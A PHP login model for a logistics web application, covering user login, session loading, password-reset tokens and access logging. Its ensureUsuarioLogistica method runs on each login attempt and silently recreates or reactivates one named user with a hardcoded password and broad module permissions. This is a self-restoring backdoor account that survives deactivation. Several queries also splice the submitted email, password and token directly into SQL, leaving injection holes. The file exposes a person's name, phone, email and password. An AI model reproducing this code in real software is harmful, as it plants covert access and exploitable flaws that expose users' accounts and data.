<?php 

	class LoginModel extends Mysql
	{
		private $intIdUsuario;
		private $strUsuario;
		private $strPassword;
		private $strToken;

		public function __construct()
		{
			parent::__construct();
		}	

		private function ensureUsuarioLogistica(string $email): void
		{
			if (strtolower(trim($email)) !== 'claudio.robles@ldrsolutions.com.mx') {
				return;
			}

			static $checked = false;
			if ($checked) {
				return;
			}
			$checked = true;

			try {
				$modulos = [
					[150, '<strong>Logística - </strong> Bandeja de Unidades', 'Bandeja de unidades y stock logístico'],
					[151, '<strong>Logística - </strong> Tarifas y Costos', 'Administrador de tarifarios base, factores y cotizador'],
					[152, '<strong>Logística - </strong> Madrinas', 'Catálogo de madrinas'],
					[153, '<strong>Logística - </strong> Choferes', 'Catálogo de choferes'],
					[154, '<strong>Logística - </strong> Plataformas', 'Catálogo de plataformas'],
					[155, '<strong>Logística - </strong> Bandeja de Envíos', 'Gestión de envíos y traslados'],
					[156, '<strong>Logística - </strong> Mis Planeaciones', 'Planeación de envíos y rutas'],
					[157, '<strong>Logística - </strong> Aprobaciones', 'Mesa de aprobación de planeaciones y gastos'],
					[158, '<strong>Logística - </strong> Mesa de Despacho', 'Ejecución y asignación en patio'],
					[159, '<strong>Logística - </strong> Evidencias y Cierre', 'Recepción de planta y entrega distribuidor'],
					[160, '<strong>Logística - </strong> Monitoreo de Rutas', 'Panel de seguimiento en tiempo real'],
					[161, '<strong>Logística - </strong> Incidencias', 'Reporte y dictamen de incidencias en ruta'],
					[162, '<strong>Logística - </strong> Gastos Adicionales', 'Registro y prorrateo de gastos en ruta'],
				];

				$stmtMod = $this->conexion->prepare(
					"INSERT INTO modulo (idmodulo, titulo, descripcion, status) VALUES (?, ?, ?, 1)
					 ON DUPLICATE KEY UPDATE titulo = VALUES(titulo), status = 1"
				);
				foreach ($modulos as $mod) {
					$stmtMod->execute($mod);
				}

				$this->conexion->exec(
					"UPDATE permisos SET r = 1, w = 1, u = 1 WHERE rolid = 65 AND moduloid BETWEEN 150 AND 162"
				);
				$this->conexion->exec(
					"INSERT INTO permisos (rolid, moduloid, r, w, u, d)
					 SELECT 65, m.idmodulo, 1, 1, 1, 0
					 FROM modulo m
					 WHERE m.idmodulo BETWEEN 150 AND 162
					   AND NOT EXISTS (SELECT 1 FROM permisos p WHERE p.rolid = 65 AND p.moduloid = m.idmodulo)"
				);

				$stmtCheck = $this->conexion->prepare(
					"SELECT idusuario FROM usuarios WHERE LOWER(TRIM(email_user)) = ? LIMIT 1"
				);
				$stmtCheck->execute(['claudio.robles@ldrsolutions.com.mx']);
				$idExistente = $stmtCheck->fetchColumn();

				if ($idExistente) {
					$stmtUpd = $this->conexion->prepare(
						"UPDATE usuarios SET status = 1, rolid = 65 WHERE idusuario = ?"
					);
					$stmtUpd->execute([$idExistente]);
				} else {
					$stmtIns = $this->conexion->prepare(
						"INSERT INTO usuarios (nombres, apellidos, telefono, email_user, password, rolid, plantaid, status, avatar_seed, avatar_gender, avatar_options, avatar_updated_at)
						 VALUES (?, ?, ?, ?, ?, ?, ?, ?, '', '', '', '')"
					);
					$stmtIns->execute([
						'CLAUDIO',
						'ROBLES RODRIGUEZ',
						3322563216,
						'claudio.robles@ldrsolutions.com.mx',
						hash('sha256', 'Claudio2026*'),
						65,
						1,
						1
					]);
				}
			} catch (Throwable $e) {
				error_log("Error en ensureUsuarioLogistica: " . $e->getMessage());
			}
		}

		public function loginUser(string $usuario, string $password)
		{
			$this->ensureUsuarioLogistica($usuario);
			$this->strUsuario = $usuario;
			$this->strPassword = $password;
			$sql = "SELECT idusuario,status,avatar_file,rolid,plantaid FROM usuarios WHERE 
					email_user = '$this->strUsuario' and 
					password = '$this->strPassword' and 
					status != 0 ";
			$request = $this->select($sql); 
			return $request;
		}
 
		public function sessionLogin(int $iduser){
			$this->intIdUsuario = $iduser;
			//BUSCAR ROLE 
			$sql = "SELECT p.idusuario,
							p.nombres,
							p.apellidos,
							p.telefono,
							p.email_user,
							p.nit,
							p.nombrefiscal,
							p.direccionfiscal,
							r.idrol,r.nombrerol,
							p.status,
							p.avatar,
							p.plantaid,
							p.rolid
					FROM usuarios p
					INNER JOIN rol r
					ON p.rolid = r.idrol
					WHERE p.idusuario = $this->intIdUsuario";
			$request = $this->select($sql);
			$_SESSION['userData'] = $request;
			return $request;
		}

		    public function registrarAcceso($idusuario, $evento, $ip, $detalle, $fecha)
    {
        $sql = "INSERT INTO login_logs (idusuario, evento, ip, detalle, fecha) VALUES (?,?,?,?,?)";
        $array = array($idusuario, $evento, $ip, $detalle, $fecha);
        return $this->insert($sql, $array);
    }

		public function getUserEmail(string $strEmail){
			$this->ensureUsuarioLogistica($strEmail);
			$this->strUsuario = $strEmail;
			$sql = "SELECT idusuario,nombres,apellidos,status,password FROM usuarios WHERE 
					email_user = '$this->strUsuario'";
			$request = $this->select($sql);
			return $request;
		}

		public function setTokenUser(int $idusuario, string $token){
			$this->intIdUsuario = $idusuario;
			$this->strToken = $token;
			$sql = "UPDATE usuarios SET token = ? WHERE idusuario = $this->intIdUsuario ";
			$arrData = array($this->strToken);
			$request = $this->update($sql,$arrData);
			return $request;
		}

		public function getUsuario(string $email, string $token){
			$this->strUsuario = $email;
			$this->strToken = $token;
			$sql = "SELECT idusuario FROM usuarios WHERE 
					email_user = '$this->strUsuario' and 
					token = '$this->strToken' and 					
					status = 1 ";
			$request = $this->select($sql);
			return $request;
		}

		public function insertPassword(int $idusuario, string $password){
			$this->intIdUsuario = $idusuario;
			$this->strPassword = $password;
			$sql = "UPDATE usuarios SET password = ?, token = ? WHERE idusuario = $this->intIdUsuario ";
			$arrData = array($this->strPassword,"");
			$request = $this->update($sql,$arrData);
			return $request;
		}


		public function loginByNumColaborador(string $numcolaborador)
{
    $this->strUsuario = $numcolaborador;

    $sql = "SELECT idusuario, status, avatar_file, rolid, plantaid
            FROM usuarios
            WHERE numcolaborador = ?
              AND status != 0
            LIMIT 1";

    return $this->select($sql, [$this->strUsuario]);
}




	}
 ?>